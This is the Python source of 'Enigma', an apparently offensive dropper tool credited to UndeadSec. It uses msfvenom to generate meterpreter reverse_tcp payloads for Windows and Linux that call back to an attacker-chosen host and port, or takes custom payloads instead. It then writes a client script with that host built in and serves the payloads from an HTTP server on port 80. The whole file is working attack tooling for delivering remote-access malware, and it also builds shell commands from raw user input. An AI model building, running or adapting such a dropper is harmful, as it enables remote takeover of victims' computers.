#------------------------------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#------------------------------------------------------
from subprocess import call as _call
from functools import partial
from time import sleep
from os import geteuid
from sys import platform

call = partial(_call, shell=True) # redefine call

RED, WHITE, YELLOW, CIANO, GREEN, END = '\033[91m', '\33[46m', '\33[93m', '\33[36m', '\033[1;32m', '\033[0m'

def show_message():
    call('clear')
    print('''
{1}:::::::::: ::::    ::: ::::::::::: ::::::::  ::::    ::::      :::     
:+:        :+:+:   :+:     :+:    :+:    :+: +:+:+: :+:+:+   :+: :+:   
+:+        :+:+:+  +:+     +:+    +:+        +:+ +:+:+ +:+  +:+   +:+  
+#++:++#   +#+ +:+ +#+     +#+    :#:        +#+  +:+  +#+ +#++:++#++: {0}
+#+        +#+  +#+#+#     +#+    +#+   +#+# +#+       +#+ +#+     +#+ 
#+#        #+#   #+#+#     #+#    #+#    #+# #+#       #+# #+#     #+# 
########## ###    #### ########### ########  ###       ### ###     ### 
						                   {1}DROPPER
                     by: UNDEADSEC from Brazil'''.format(CIANO, END))

def run_server():
    print('\n {0}[{1}*{0}]{1} Starting Server... {2}H4ppy h4ck1ng {1}:)'.format(CIANO, END, GREEN))
    sleep(3)
    call('cd Server/ && python -m SimpleHTTPServer 80')

def generate_payloads():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*')
    payloadLHOST= input('\n {0}[{1}~{0}]{1} Insert your payload LHOST: '.format(CIANO, END))
    payloadLPORT= input('\n {0}[{1}~{0}]{1} Insert your payload LPORT: '.format(CIANO, END))
    print('\n {0}[{1}~{0}]{1} Generating Payloads...'.format(CIANO, END))
    call('msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f elf -o Server/x64/lin.elf')
    call('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f elf -o Server/x86/lin.elf')
    call('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f exe -o Server/x64/win.exe')
    call('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f exe -o Server/x86/win.exe')

def generate_client():
    lhost = input('\n {0}[{1}~{0}]{1} Insert your LHOST: '.format(CIANO, END))
    with open('Clients/sister.py', 'r', encoding='utf-8') as file:
        template = file.read()
    
    with open('Output/sister.py', 'w', encoding='utf-8') as file:
        file.write('#!/usr/bin/python\nhost = \'' + lhost + '\'\n')
        file.write(template)
    
    print('\n {0}[{1}~{0}]{1} Generating Clients...'.format(CIANO, END))
    sleep(3)
    print('\n {0}[{1}*{0}]{1} Process done.\n\n {2}[{1}*{2}] Clients saved to Output/{1}'.format(CIANO, END, GREEN))

def init():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*')
    print('\n {0}[{1}~{0}]{1} Arranging the house...'.format(CIANO, END))
    sleep(3)
    call('cp ' + win64 + ' Server/x64/win.exe')
    call('cp ' + win86 + ' Server/x86/win.exe')
    call('cp ' + lin64 + ' Server/x64/lin.elf')
    call('cp ' + lin86 + ' Server/x86/lin.elf')
    print('\n {0}[{1}*{0}]{1} Process done.'.format(CIANO, END))

def main():
    global win64, win86, lin64, lin86, mac64, mac86
    print(' Select an option:\n\n {0}[{1}1{0}]{1} Insert your custom payloads  -> Recommended\n\n {0}[{1}2{0}]{1} Generate payloads with metasploit'.format(CIANO, END))
    option = input('\n{0} EN1GM4 {1}> '.format(CIANO, END))
    
    if option == '1':
        win64 = input('\n {0}[{1}1{0}/{1}4{0}]{1} Insert Windows Payload x64 file path: '.format(CIANO, END))
        win86 = input('\n {0}[{1}2{0}/{1}4{0}]{1} Insert Windows Payload x86 file path: '.format(CIANO, END))
        lin64 = input('\n {0}[{1}3{0}/{1}4{0}]{1} Insert Linux Payload x64 file path: '.format(CIANO, END))
        lin86 = input('\n {0}[{1}4{0}/{1}4{0}]{1} Insert Linux Payload x86 file path: '.format(CIANO, END))
        init()
    elif option == '2':
        generate_payloads()
    else:
        leave = input('Generate clients and run the server? (y|n)')
        if leave.lower().startswith('n'):
            raise SystemExit('See you soon! :)')
            
    generate_client()
    run_server()

if __name__ == '__main__':
    if not platform.startswith('linux'):
        raise RuntimeError("Supported only Linux")

    if geteuid() != 0:
        raise PermissionError('Enigma must be run as root')
        
    show_message()
    main()
